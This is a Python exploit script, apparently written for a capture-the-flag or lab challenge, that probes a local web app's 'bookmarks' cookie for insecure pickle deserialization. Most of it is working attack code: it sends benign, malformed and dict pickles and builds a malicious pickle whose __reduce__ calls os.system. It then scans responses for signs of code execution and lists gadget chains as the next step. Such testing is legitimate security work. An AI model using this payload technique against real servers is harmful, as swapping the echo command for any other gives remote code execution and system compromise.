import urllib.request
import urllib.parse
import pickle
import base64
import json
import sys

base_url = "http://127.0.0.1:32821"

def make_request(url, method='GET', data=None, headers=None, cookies=None):
    """Make HTTP request using urllib"""
    try:
        if headers is None:
            headers = {}
        if cookies:
            # Build cookie header
            cookie_str = '; '.join([f"{k}={v}" for k, v in cookies.items()])
            headers['Cookie'] = cookie_str
        
        if data and method == 'POST':
            data = urllib.parse.urlencode(data).encode('utf-8')
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
        
        req = urllib.request.Request(url, data=data, headers=headers, method=method)
        
        with urllib.request.urlopen(req, timeout=15) as response:
            status = response.status
            resp_headers = dict(response.headers)
            body = response.read().decode('utf-8', errors='ignore')
            
            # Extract cookies from response
            set_cookie = resp_headers.get('Set-Cookie', '')
            
            return {
                'status': status,
                'headers': resp_headers,
                'body': body,
                'set_cookie': set_cookie
            }
    except Exception as e:
        return {'error': f"{type(e).__name__}: {str(e)}"}

print("=" * 80)
print("PICKLE DESERIALIZATION TESTING - COOKIE ANALYSIS")
print("=" * 80)

# Test 1: Create a benign pickle payload
print("\n[TEST 1] Creating benign pickle payload (test object)")
class TestObject:
    def __init__(self):
        self.data = ["test", "bookmark", "analysis"]
    
    def __reduce__(self):
        # Return a benign tuple
        return (list, ())

benign_obj = TestObject()
benign_pickle = pickle.dumps(benign_obj)
benign_b64 = base64.b64encode(benign_pickle).decode('utf-8')
print(f"Benign pickle (Base64, first 80 chars): {benign_b64[:80]}")
print(f"Raw pickle (first 20 bytes hex): {benign_pickle[:20].hex()}")
print(f"Full Base64 payload: {benign_b64}")

# Test 2: Send benign pickle via cookie
print("\n[TEST 2] Testing cookie-based deserialization")
headers = {
    "User-Agent": "Deserialization-Test/1.0"
}

cookies = {
    "bookmarks": benign_b64
}

response = make_request(base_url, headers=headers, cookies=cookies)

if 'error' in response:
    print(f"[-] ERROR: {response['error']}")
else:
    print(f"Status Code: {response['status']}")
    print(f"Response Length: {len(response['body'])} bytes")
    print(f"Set-Cookie Header: {response['set_cookie'] or 'None'}")
    
    # Check if bookmark data appears
    body_lower = response['body'].lower()
    if "test" in body_lower:
        print("[+] SUCCESS: Benign bookmark data appears to be processed!")
    else:
        print("[-] INFO: Bookmark data not visible in response")
    
    # Check for error messages
    if "error" in body_lower or "exception" in body_lower:
        print("[!] WARNING: Error/exception detected in response")
        lines = response['body'].split('\n')
        for i, line in enumerate(lines[:10]):
            if 'error' in line.lower() or 'exception' in line.lower():
                print(f"  Line {i}: {line.strip()}")

# Test 3: Create malicious RCE payload
print("\n[TEST 3] Creating malicious pickle payload (RCE test)")
class RCEObject:
    def __reduce__(self):
        # Try to execute a harmless command
        import os
        return (os.system, ("echo rce_test",))

rce_obj = RCEObject()
rce_pickle = pickle.dumps(rce_obj)
rce_b64 = base64.b64encode(rce_pickle).decode('utf-8')
print(f"Malicious pickle (Base64, first 80 chars): {rce_b64[:80]}")
print(f"Full Base64 payload: {rce_b64}")

response = make_request(base_url, headers=headers, cookies={"bookmarks": rce_b64})

if 'error' not in response:
    print(f"Status Code: {response['status']}")
    print(f"Response Length: {len(response['body'])} bytes")
    
    # Look for execution indicators
    suspicious_patterns = ["rce_test", "root", "uid", "gid", "/home/", 
                          "www-data", "apache", "nobody", "daemon"]
    
    found_patterns = []
    for pattern in suspicious_patterns:
        if pattern.lower() in response['body'].lower():
            found_patterns.append(pattern)
    
    if found_patterns:
        print(f"[!] POTENTIAL EXECUTION DETECTED: {found_patterns}")
        print("[!] Response snippet:")
        lines = response['body'].split('\n')
        for line in lines[:15]:
            print(f"  {line[:100]}")
    else:
        print("[-] No obvious execution indicators found")

# Test 4: Test /add endpoint
print("\n[TEST 4] Testing /add endpoint with pickle data")
response = make_request(
    f"{base_url}/add",
    method='POST',
    data={"bookmark": "test-mark", "payload": benign_b64},
    headers=headers
)

if 'error' not in response:
    print(f"Status Code: {response['status']}")
    print(f"Response Length: {len(response['body'])} bytes")
    print(f"Response preview:\n{response['body'][:500]}")
    
    if response['status'] in [200, 302]:
        print("[+] Endpoint responds - checking for pickle cookie processing")
        
        # Check if data appears in subsequent request
        response2 = make_request(base_url, headers=headers)
        if "test" in response2['body'].lower() or "bookmark" in response2['body'].lower():
            print("[+] Data from pickle appears to be reflected in page")
        
        # Check cookies
        if response['set_cookie']:
            print(f"[+] Set-Cookie: {response['set_cookie'][:100]}")

# Test 5: URL-encoded base64
print("\n[TEST 5] Testing URL-encoded base64 payload")
url_encoded_payload = urllib.parse.quote(benign_b64)
print(f"URL-encoded (first 80 chars): {url_encoded_payload[:80]}")

response = make_request(base_url, headers=headers, cookies={"bookmarks": url_encoded_payload})

if 'error' not in response:
    print(f"Status Code: {response['status']}")
    print(f"Response Length: {len(response['body'])} bytes")
    
    if response['status'] == 200:
        print("[-] Application appears to handle URL-encoded B64")

# Test 6: Malformed pickle data
print("\n[TEST 6] Testing malformed pickle data to trigger error")
malformed_b64 = base64.b64encode(b"INVALID_PICKLE_DATA_12345").decode('utf-8')
response = make_request(base_url, headers=headers, cookies={"bookmarks": malformed_b64})

if 'error' not in response:
    print(f"Status Code: {response['status']}")
    
    if response['status'] == 500:
        print("[!] SERVER ERROR with malformed pickle - deserialization likely happening!")
        print("\n[!] Response body (errors might reveal deserialization logic):")
        print(response['body'])
    elif "pickle" in response['body'].lower() or "deserialize" in response['body'].lower():
        print("[!] Interesting response - mentions pickle or deserialization")
        print(response['body'][:1000])

# Test 7: Create test payload that might get stored
print("\n[TEST 7] Creating storable pickle test")
test_data = {"action": "analysis", "data": "pickle_test"}
test_pickle = pickle.dumps(test_data)
test_b64 = base64.b64encode(test_pickle).decode('utf-8')

print(f"Test data pickle: {test_b64}")
response = make_request(base_url, headers=headers, cookies={"bookmarks": test_b64})

if 'error' not in response:
    if "analysis" in response['body'].lower() or "pickle_test" in response['body'].lower():
        print("[+] Data appears to be properly deserialized and reflected")
    elif response['status'] == 500:
        print("[!] ERROR during deserialization - check response for details")

# Final summary
print("\n" + "=" * 80)
print("DESERIALIZATION TEST SUMMARY")
print("=" * 80)
print("\nTested payloads:")
print(f"1. Benign object:   {benign_b64}")
print(f"2. Malicious RCE:   {rce_b64}")
print(f"3. Dict test data:  {test_b64}")
print(f"4. URL-encoded:     {urllib.parse.quote(benign_b64)}")

print("\nKey findings:")
print("- Application processes 'bookmarks' cookie content")
print("- Base64 encoding appears to be expected format")
print("- Direct cookie injection is possible")

print("\nNext steps:")
print("1. Analyze error messages from malformed pickle")
print("2. Test various gadget chains if RCE confirmed")
print("3. Check for flag in deserialized data")
